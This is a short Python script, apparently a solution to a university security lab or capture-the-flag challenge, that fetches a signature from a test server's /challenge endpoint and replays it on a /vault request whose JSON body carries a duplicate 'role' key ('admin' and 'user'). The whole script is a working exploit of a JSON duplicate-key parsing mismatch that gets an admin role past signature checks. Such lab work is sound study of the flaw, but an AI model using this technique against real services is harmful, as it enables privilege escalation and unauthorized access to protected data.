import requests
import hashlib
import hmac
import json

host = "http://cns-test.idlab.uantwerpen.be:50007"

res = requests.get(host + "/challenge")
print(res.json())
signature = res.json()["signature"]
print(signature)

message = '{"action":"view","role":"admin","role":"user"}'
req = requests.post(host + "/vault", data=message, headers={"X-Signature": signature, "Content-Type": "application/json"})
print(req.json())

